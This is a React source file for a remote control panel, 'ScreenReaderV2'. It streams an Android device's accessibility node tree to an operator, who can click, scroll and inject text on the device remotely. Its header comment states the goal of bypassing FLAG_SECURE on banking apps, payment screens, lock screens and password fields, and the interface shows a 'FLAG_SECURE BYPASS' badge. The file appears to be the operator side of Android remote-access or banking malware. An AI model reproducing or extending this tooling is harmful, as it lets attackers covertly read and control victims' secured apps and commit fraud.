/**
 * ScreenReaderV2.jsx
 *
 * Renders the Android AccessibilityNodeInfo tree as an interactive canvas.
 *
 * WHY IT EXISTS:
 *   Normal VNC (MediaProjection / takeScreenshot) honours FLAG_SECURE → black
 *   frames on banking apps, payment screens, lock screens, and password fields.
 *   Android's AccessibilityService.getRootInActiveWindow() is MANDATED to work
 *   for TalkBack on every window — FLAG_SECURE has no effect on node info.
 *
 *   This component:
 *     1. Receives the JSON node tree from the device (~3-15 KB vs ~150 KB JPEG)
 *     2. Draws each node as a typed, coloured rectangle on a canvas
 *     3. Maps canvas clicks → node.performAction(ACTION_CLICK) via accessibility
 *     4. Maps keyboard → node.performAction(ACTION_SET_TEXT) on focused editable
 *     5. Maps mouse wheel → ACTION_SCROLL_FORWARD/BACKWARD on scrollable nodes
 *     6. Provides global actions (HOME/BACK/RECENTS) via GLOBAL_ACTION_* API
 *
 *   Result: full interactive screen control on FLAG_SECURE windows at 30-60 fps
 *   with no pixel streaming, no JPEG, no MediaProjection, no FLAG_SECURE blocks.
 */

import { useEffect, useRef, useState, useCallback } from 'react'
import { useDeviceStore, useWSStore } from '@/store'
import { ws } from '@/utils/ws'
import { C } from '@/utils/commands'
import { Play, Square, RefreshCw, Home, ChevronLeft, List, Bell, Settings, Keyboard, MousePointer, Move, AlignLeft } from 'lucide-react'
import clsx from 'clsx'

// ──────────────────────────────────────────────────────────────
// NODE CLASSIFICATION
// ──────────────────────────────────────────────────────────────

function nodeClass(cls = '') {
  const c = cls.toLowerCase()
  if (c.includes('edittext') || c.includes('autocomplete')) return 'edit'
  if (c.includes('button') || c.includes('chip') || c.includes('fab'))  return 'button'
  if (c.includes('checkbox') || c.includes('switch') || c.includes('toggle')) return 'check'
  if (c.includes('imageview') || c.includes('imagebutton')) return 'image'
  if (c.includes('recyclerview') || c.includes('listview') || c.includes('scrollview') || c.includes('nestedscroll')) return 'scroll'
  if (c.includes('textview') || c.includes('text')) return 'text'
  if (c.includes('viewgroup') || c.includes('framelayout') || c.includes('linearlayout') ||
      c.includes('relativelayout') || c.includes('constraintlayout') || c.includes('coordinatorlayout')) return 'container'
  return 'generic'
}

// ──────────────────────────────────────────────────────────────
// CANVAS DRAWING
// ──────────────────────────────────────────────────────────────

const COLORS = {
  edit:      { fill: 'rgba(59,130,246,0.18)',  stroke: '#3b82f6',  text: '#93c5fd' },
  button:    { fill: 'rgba(212,160,23,0.18)',  stroke: '#d4a017',  text: '#fcd34d' },
  check:     { fill: 'rgba(20,184,166,0.15)',  stroke: '#14b8a6',  text: '#5eead4' },
  image:     { fill: 'rgba(100,100,120,0.10)', stroke: '#6b7280',  text: '#9ca3af' },
  scroll:    { fill: 'rgba(0,0,0,0)',          stroke: '#374151',  text: '#6b7280' },
  text:      { fill: 'rgba(0,0,0,0)',          stroke: 'transparent', text: 'rgba(255,255,255,0.75)' },
  container: { fill: 'rgba(0,0,0,0)',          stroke: 'rgba(55,65,81,0.4)', text: '' },
  generic:   { fill: 'rgba(0,0,0,0)',          stroke: 'rgba(55,65,81,0.3)', text: '' },
}

function drawNodes(ctx, nodes, sw, sh, cw, ch, hoveredId, selectedId) {
  const sx = cw / sw
  const sy = ch / sh

  // Sort: containers first (back), leaves last (front)
  const sorted = [...nodes].sort((a, b) => (a.depth ?? 0) - (b.depth ?? 0))

  ctx.save()
  ctx.font = '11px "JetBrains Mono", monospace'
  ctx.textBaseline = 'middle'

  for (const node of sorted) {
    const [l, t, r, b] = node.b || [0, 0, 0, 0]
    const x = l * sx, y = t * sy, w = (r - l) * sx, h = (b - t) * sy
    if (w < 2 || h < 2) continue

    const type  = node.clickable && !node.edit ? (nodeClass(node.cls) === 'check' ? 'check' : 'button') : nodeClass(node.cls)
    const color = COLORS[type] || COLORS.generic
    const isFocused  = node.focus
    const isHovered  = node.id === hoveredId
    const isSelected = node.id === selectedId

    // Fill
    if (color.fill !== 'rgba(0,0,0,0)') {
      ctx.fillStyle = isHovered ? color.fill.replace(/[\d.]+\)$/, '0.35)') : color.fill
      ctx.fillRect(x, y, w, h)
    }

    // Focused glow
    if (isFocused) {
      ctx.shadowColor = '#22d36e'
      ctx.shadowBlur  = 10
    }
    if (isSelected) {
      ctx.shadowColor = '#f59e0b'
      ctx.shadowBlur  = 8
    }

    // Stroke
    if (color.stroke !== 'transparent') {
      ctx.strokeStyle = isHovered  ? '#f5c842'
                      : isSelected ? '#f59e0b'
                      : isFocused  ? '#22d36e'
                      : color.stroke

      if (type === 'scroll') {
        ctx.setLineDash([4, 3])
        ctx.lineWidth = 0.8
      } else {
        ctx.setLineDash([])
        ctx.lineWidth = isHovered || isFocused || isSelected ? 1.5 : 0.8
      }
      ctx.strokeRect(x + 0.5, y + 0.5, w - 1, h - 1)
      ctx.setLineDash([])
      ctx.shadowColor = 'transparent'
      ctx.shadowBlur  = 0
    } else {
      ctx.shadowColor = 'transparent'
      ctx.shadowBlur  = 0
    }

    // Label — only render if node is big enough and has text
    if (color.text && h > 10 && w > 20) {
      const label = node.text || node.hint || node.desc || ''
      if (label) {
        ctx.fillStyle = color.text
        ctx.font = h > 24 ? '11px "JetBrains Mono", monospace' : '9px "JetBrains Mono", monospace'
        const maxW = w - 8
        let display = label
        // Truncate
        while (display.length > 1 && ctx.measureText(display).width > maxW) {
          display = display.slice(0, -1)
        }
        if (display.length < label.length) display += '…'
        ctx.fillText(display, x + 4, y + h / 2)
      }
    }

    // Editable indicator
    if (type === 'edit') {
      ctx.fillStyle = '#3b82f6'
      ctx.fillRect(x, y, 3, h)
    }
  }
  ctx.restore()
}

// ──────────────────────────────────────────────────────────────
// HIT-TEST
// ──────────────────────────────────────────────────────────────

function hitTest(nodes, dx, dy, requireClickable = true) {
  // Walk from deepest (highest depth) upward to find the smallest node at point
  const candidates = [...nodes]
    .filter(n => {
      if (!n.b) return false
      const [l, t, r, b] = n.b
      return dx >= l && dx <= r && dy >= t && dy <= b && n.en !== false
    })
    .sort((a, b) => (b.depth ?? 0) - (a.depth ?? 0))

  if (requireClickable) {
    const clickable = candidates.find(n => n.clickable || n.edit || n.scroll)
    return clickable || candidates[0] || null
  }
  return candidates[0] || null
}

// ──────────────────────────────────────────────────────────────
// COMPONENT
// ──────────────────────────────────────────────────────────────

const MODES = {
  click:  { label: 'CLICK',       icon: MousePointer, color: 'text-gold'   },
  type:   { label: 'TYPE',        icon: Keyboard,     color: 'text-info'   },
  scroll: { label: 'SCROLL',      icon: Move,         color: 'text-teal'   },
  info:   { label: 'INFO',        icon: AlignLeft,    color: 'text-textSecondary' },
}

export default function ScreenReaderV2({ deviceId }) {
  const sr2Data    = useDeviceStore(s => s.sr2Frames?.[deviceId])
  const canvasRef  = useRef(null)
  const rafRef     = useRef(null)
  const dirtyRef   = useRef(true)

  const [running,    setRunning]    = useState(false)
  const [fps,        setFps]        = useState(0)
  const [latency,    setLatency]    = useState(0)
  const [mode,       setMode]       = useState('click')  // click|type|scroll|info
  const [hoveredId,  setHoveredId]  = useState(null)
  const [selectedId, setSelectedId] = useState(null)
  const [selectedNode, setSelectedNode] = useState(null)
  const [typeText,   setTypeText]   = useState('')
  const [showOverlay, setShowOverlay] = useState(true)

  const nodesRef    = useRef([])
  const swRef       = useRef(1080)
  const shRef       = useRef(2340)
  const lastFrame   = useRef(0)
  const frameCount  = useRef(0)
  const lastFpsTs   = useRef(Date.now())

  // ── Sync incoming SR2 data ──────────────────────────────────
  useEffect(() => {
    if (!sr2Data) return
    nodesRef.current = sr2Data.nodes || []
    swRef.current    = sr2Data.sw    || 1080
    shRef.current    = sr2Data.sh    || 2340
    dirtyRef.current = true

    // FPS counter
    frameCount.current++
    const now = Date.now()
    const elapsed = (now - lastFpsTs.current) / 1000
    if (elapsed >= 1) {
      setFps(Math.round(frameCount.current / elapsed))
      frameCount.current = 0
      lastFpsTs.current  = now
    }
    setLatency(now - (sr2Data.ts || now))
  }, [sr2Data])

  // ── RAF render loop ─────────────────────────────────────────
  useEffect(() => {
    const loop = () => {
      rafRef.current = requestAnimationFrame(loop)
      if (!dirtyRef.current) return
      dirtyRef.current = false
      const canvas = canvasRef.current
      if (!canvas) return
      const ctx = canvas.getContext('2d')
      const { width: cw, height: ch } = canvas

      // Background
      ctx.fillStyle = '#0a0a0a'
      ctx.fillRect(0, 0, cw, ch)

      if (nodesRef.current.length === 0) {
        ctx.fillStyle = 'rgba(255,255,255,0.2)'
        ctx.font = '13px "JetBrains Mono", monospace'
        ctx.textAlign = 'center'
        ctx.fillText('Waiting for Screen Reader V2 frame…', cw / 2, ch / 2)
        ctx.textAlign = 'left'
        return
      }

      drawNodes(ctx, nodesRef.current, swRef.current, shRef.current, cw, ch, hoveredId, selectedId)

      // Overlay: package + activity name
      if (showOverlay && sr2Data) {
        ctx.fillStyle = 'rgba(0,0,0,0.65)'
        ctx.fillRect(0, 0, cw, 20)
        ctx.fillStyle = '#d4a017'
        ctx.font = '10px "JetBrains Mono", monospace'
        ctx.fillText(`${sr2Data.pkg || '—'} · ${(sr2Data.activity || '').split('.').pop()}`, 6, 13)
        ctx.fillStyle = 'rgba(255,255,255,0.4)'
        ctx.fillText(`${fps} fps · ${latency}ms · ${nodesRef.current.length} nodes`, cw - 140, 13)
      }
    }
    rafRef.current = requestAnimationFrame(loop)
    return () => cancelAnimationFrame(rafRef.current)
  }, [hoveredId, selectedId, fps, latency, showOverlay, sr2Data])

  // ── Coord conversion: canvas px → device px ─────────────────
  const toDevice = useCallback((e) => {
    const canvas = canvasRef.current
    if (!canvas) return [0, 0]
    const rect = canvas.getBoundingClientRect()
    const sx   = swRef.current / canvas.offsetWidth
    const sy   = shRef.current / canvas.offsetHeight
    return [
      (e.clientX - rect.left) * sx,
      (e.clientY - rect.top)  * sy,
    ]
  }, [])

  // ── Mouse move → hover highlight ────────────────────────────
  const handleMouseMove = useCallback((e) => {
    if (!nodesRef.current.length) return
    const [dx, dy] = toDevice(e)
    const node = hitTest(nodesRef.current, dx, dy, false)
    const id = node?.id ?? null
    if (id !== hoveredId) {
      setHoveredId(id)
      dirtyRef.current = true
    }
  }, [hoveredId, toDevice])

  // ── Click → ACTION_CLICK via accessibility service ──────────
  const handleClick = useCallback((e) => {
    if (!nodesRef.current.length || !deviceId) return
    const [dx, dy] = toDevice(e)

    if (mode === 'info') {
      const node = hitTest(nodesRef.current, dx, dy, false)
      setSelectedId(node?.id ?? null)
      setSelectedNode(node ?? null)
      dirtyRef.current = true
      return
    }

    if (mode === 'type') {
      // Focus the editable node
      const node = hitTest(nodesRef.current, dx, dy, true)
      if (node?.edit || node?.cls?.toLowerCase().includes('edit')) {
        setSelectedId(node.id)
        setSelectedNode(node)
        ws.sendCommand(deviceId, {
          action: 'PERFORM_NODE_ACTION',
          node_id: node.id,
          action_type: 'FOCUS',
          bounds: node.b,
        })
        dirtyRef.current = true
      }
      return
    }

    if (mode === 'scroll') {
      // handled by wheel
      return
    }

    // Default: CLICK mode
    const node = hitTest(nodesRef.current, dx, dy, true)
    if (node) {
      setSelectedId(node.id)
      setSelectedNode(node)
      dirtyRef.current = true
      ws.sendCommand(deviceId, {
        action: 'PERFORM_NODE_ACTION',
        node_id: node.id,
        action_type: 'CLICK',
        bounds: node.b,
      })
    } else {
      // Fallback: dispatchGesture tap via accessibility
      ws.sendCommand(deviceId, C.accessibilityTap(
        parseFloat((dx / swRef.current).toFixed(4)),
        parseFloat((dy / shRef.current).toFixed(4)),
      ))
    }
  }, [deviceId, mode, toDevice])

  // ── Mouse wheel → SCROLL_FORWARD/BACKWARD ──────────────────
  const handleWheel = useCallback((e) => {
    if (!deviceId) return
    e.preventDefault()
    const [dx, dy] = toDevice(e)
    const node = hitTest(nodesRef.current, dx, dy, false)
    const scrollableNode = node
      ? nodesRef.current.find(n => n.scroll && n.b &&
          dx >= n.b[0] && dx <= n.b[2] && dy >= n.b[1] && dy <= n.b[3])
      : null
    ws.sendCommand(deviceId, {
      action: 'PERFORM_NODE_ACTION',
      node_id: scrollableNode?.id ?? null,
      action_type: e.deltaY > 0 ? 'SCROLL_FWD' : 'SCROLL_BWD',
      bounds: scrollableNode?.b ?? null,
    })
  }, [deviceId, toDevice])

  // ── Keyboard → SET_TEXT on selected editable node ──────────
  const handleKeyDown = useCallback((e) => {
    if (!deviceId || !selectedNode) return
    if (e.key === 'Enter') {
      ws.sendCommand(deviceId, {
        action: 'PERFORM_NODE_ACTION',
        node_id: selectedNode.id,
        action_type: 'CLICK',
        bounds: selectedNode.b,
      })
      return
    }
    if (e.key === 'Backspace') {
      const next = typeText.slice(0, -1)
      setTypeText(next)
      ws.sendCommand(deviceId, {
        action: 'ACCESSIBILITY_SET_TEXT',
        node_id: selectedNode.id,
        text: next,
      })
      return
    }
    if (e.key.length === 1) {
      const next = typeText + e.key
      setTypeText(next)
      ws.sendCommand(deviceId, {
        action: 'ACCESSIBILITY_SET_TEXT',
        node_id: selectedNode.id,
        text: next,
      })
    }
  }, [deviceId, selectedNode, typeText])

  // ── Start / Stop SR2 ────────────────────────────────────────
  const startSR2 = () => {
    if (!deviceId) return
    ws.sendCommand(deviceId, C.startSR2(30))
    setRunning(true)
  }
  const stopSR2 = () => {
    if (!deviceId) return
    ws.sendCommand(deviceId, C.stopSR2())
    setRunning(false)
  }
  const snapshot = () => {
    if (!deviceId) return
    ws.sendCommand(deviceId, C.sr2Snapshot())
  }

  // ── Global actions ─────────────────────────────────────────
  const globalAction = (id) => deviceId && ws.sendCommand(deviceId, C.performGlobalAction(id))

  return (
    <div className="space-y-2" onKeyDown={handleKeyDown} tabIndex={0} style={{ outline: 'none' }}>

      {/* ── Top Controls ─────────────────────────────────── */}
      <div className="flex items-center gap-2 flex-wrap">
        {/* Start/Stop */}
        {!running ? (
          <button onClick={startSR2} className="btn-gold text-xs flex items-center gap-1.5 py-1.5">
            <Play size={11} />START SR2
          </button>
        ) : (
          <button onClick={stopSR2} className="btn-danger text-xs flex items-center gap-1.5 py-1.5">
            <Square size={11} />STOP
          </button>
        )}
        <button onClick={snapshot} className="btn-outline text-xs flex items-center gap-1.5 py-1.5">
          <RefreshCw size={11} />SNAPSHOT
        </button>

        {/* FPS / latency */}
        <div className="px-2 py-1.5 rounded-lg bg-surface border border-border font-mono text-xs text-textMuted">
          {fps} FPS · {latency}ms
        </div>

        {/* Node count */}
        {sr2Data && (
          <div className="px-2 py-1.5 rounded-lg bg-gold/10 border border-gold/20 font-mono text-xs text-gold">
            {nodesRef.current.length} NODES
          </div>
        )}

        <div className="flex-1" />

        {/* Overlay toggle */}
        <button
          onClick={() => setShowOverlay(v => !v)}
          className={clsx('btn-outline text-xs py-1.5', showOverlay && 'border-gold/40 text-gold')}
        >
          OVERLAY
        </button>
      </div>

      {/* ── Interaction Mode Selector ─────────────────────── */}
      <div className="flex gap-1">
        {Object.entries(MODES).map(([key, { label, icon: Icon, color }]) => (
          <button
            key={key}
            onClick={() => setMode(key)}
            className={clsx(
              'flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg border text-xs font-mono transition-all',
              mode === key
                ? `bg-gold/10 border-gold/30 text-gold`
                : 'border-border text-textMuted hover:border-gold/20 hover:text-textPrimary'
            )}
          >
            <Icon size={11} />{label}
          </button>
        ))}
      </div>

      {/* ── Canvas ──────────────────────────────────────────── */}
      <div
        className="relative rounded-xl overflow-hidden border border-border bg-black cursor-crosshair"
        style={{ aspectRatio: `${swRef.current}/${shRef.current}`, maxHeight: '68vh' }}
      >
        <canvas
          ref={canvasRef}
          width={swRef.current}
          height={shRef.current}
          className="w-full h-full"
          style={{ imageRendering: 'pixelated', touchAction: 'none' }}
          onMouseMove={handleMouseMove}
          onClick={handleClick}
          onWheel={handleWheel}
          onMouseLeave={() => { setHoveredId(null); dirtyRef.current = true }}
        />

        {/* FLAG_SECURE badge */}
        <div className="absolute top-2 right-2 px-2 py-1 rounded-lg bg-online/10 border border-online/20 text-online text-[10px] font-mono font-bold">
          ⚡ FLAG_SECURE BYPASS
        </div>

        {/* Mode indicator overlay */}
        <div className={clsx(
          'absolute bottom-2 left-2 px-2 py-1 rounded-lg border text-[10px] font-mono transition-all',
          mode === 'click'  ? 'bg-gold/10 border-gold/20 text-gold' :
          mode === 'type'   ? 'bg-info/10 border-info/20 text-info' :
          mode === 'scroll' ? 'bg-teal/10 border-teal/20 text-teal' :
          'bg-surface border-border text-textMuted'
        )}>
          MODE: {mode.toUpperCase()}
        </div>
      </div>

      {/* ── Global Action Bar ─────────────────────────────── */}
      <div className="card py-2 flex items-center gap-2 flex-wrap">
        <span className="label">GLOBAL:</span>
        {[
          { id: 1, label: 'HOME',          icon: Home         },
          { id: 2, label: 'BACK',          icon: ChevronLeft  },
          { id: 3, label: 'RECENTS',       icon: List         },
          { id: 4, label: 'NOTIFICATIONS', icon: Bell         },
          { id: 5, label: 'QUICK SETTINGS',icon: Settings     },
        ].map(({ id, label, icon: Icon }) => (
          <button
            key={id}
            onClick={() => globalAction(id)}
            className="btn-outline text-xs py-1 flex items-center gap-1"
          >
            <Icon size={10} />{label}
          </button>
        ))}
      </div>

      {/* ── Type input bar (shown in TYPE mode) ─────────── */}
      {mode === 'type' && (
        <div className="card space-y-2">
          <p className="label">
            TYPING INTO: <span className="text-info">{selectedNode?.hint || selectedNode?.cls || 'click an editable field first'}</span>
          </p>
          <div className="flex gap-2">
            <input
              value={typeText}
              onChange={e => setTypeText(e.target.value)}
              onKeyDown={e => {
                if (!selectedNode) return
                e.stopPropagation()
                if (e.key === 'Enter') {
                  ws.sendCommand(deviceId, { action: 'PERFORM_NODE_ACTION', node_id: selectedNode.id, action_type: 'CLICK', bounds: selectedNode.b })
                  return
                }
                ws.sendCommand(deviceId, { action: 'ACCESSIBILITY_SET_TEXT', node_id: selectedNode.id, text: e.target.value })
              }}
              placeholder="Type text to inject into selected field..."
              className="input flex-1 text-xs"
            />
            <button
              onClick={() => {
                if (selectedNode && typeText) {
                  ws.sendCommand(deviceId, { action: 'ACCESSIBILITY_SET_TEXT', node_id: selectedNode.id, text: typeText })
                }
              }}
              className="btn-info text-xs"
            >
              INJECT TEXT
            </button>
            <button
              onClick={() => {
                setTypeText('')
                if (selectedNode) ws.sendCommand(deviceId, { action: 'ACCESSIBILITY_SET_TEXT', node_id: selectedNode.id, text: '' })
              }}
              className="btn-outline text-xs"
            >
              CLEAR
            </button>
          </div>
        </div>
      )}

      {/* ── Selected Node Info (INFO mode) ───────────────── */}
      {mode === 'info' && selectedNode && (
        <div className="card space-y-1.5">
          <p className="section-header">SELECTED NODE</p>
          {[
            ['ID',         selectedNode.id],
            ['CLASS',      selectedNode.cls],
            ['TEXT',       selectedNode.text || '—'],
            ['HINT',       selectedNode.hint || '—'],
            ['DESC',       selectedNode.desc || '—'],
            ['BOUNDS',     selectedNode.b ? `[${selectedNode.b.join(', ')}]` : '—'],
            ['CLICKABLE',  String(selectedNode.clickable ?? false)],
            ['EDITABLE',   String(selectedNode.edit ?? false)],
            ['FOCUSED',    String(selectedNode.focus ?? false)],
            ['SCROLLABLE', String(selectedNode.scroll ?? false)],
            ['ENABLED',    String(selectedNode.en ?? true)],
          ].map(([k, v]) => (
            <div key={k} className="flex items-center gap-2">
              <span className="label w-24 flex-shrink-0">{k}</span>
              <span className="font-mono text-xs text-textPrimary truncate">{v}</span>
            </div>
          ))}
          <div className="flex gap-1.5 pt-1 flex-wrap">
            <button
              onClick={() => ws.sendCommand(deviceId, { action: 'PERFORM_NODE_ACTION', node_id: selectedNode.id, action_type: 'CLICK', bounds: selectedNode.b })}
              className="btn-gold text-xs"
            >⚡ CLICK</button>
            <button
              onClick={() => ws.sendCommand(deviceId, { action: 'PERFORM_NODE_ACTION', node_id: selectedNode.id, action_type: 'LONG_CLICK', bounds: selectedNode.b })}
              className="btn-outline text-xs"
            >LONG CLICK</button>
            <button
              onClick={() => ws.sendCommand(deviceId, { action: 'PERFORM_NODE_ACTION', node_id: selectedNode.id, action_type: 'FOCUS', bounds: selectedNode.b })}
              className="btn-outline text-xs"
            >FOCUS</button>
            <button
              onClick={() => ws.sendCommand(deviceId, { action: 'PERFORM_NODE_ACTION', node_id: selectedNode.id, action_type: 'SCROLL_FWD', bounds: selectedNode.b })}
              className="btn-outline text-xs"
            >SCROLL ↓</button>
          </div>
        </div>
      )}

      {/* ── Legend ──────────────────────────────────────────── */}
      <div className="flex gap-3 flex-wrap">
        {[
          ['EditText',   '#3b82f6'],
          ['Button',     '#d4a017'],
          ['CheckBox',   '#14b8a6'],
          ['Focused',    '#22d36e'],
          ['Scroll',     '#374151'],
        ].map(([label, color]) => (
          <div key={label} className="flex items-center gap-1.5 text-[10px] font-mono text-textMuted">
            <span className="w-2.5 h-2.5 rounded-sm border" style={{ borderColor: color, background: color + '33' }} />
            {label}
          </div>
        ))}
      </div>
    </div>
  )
}
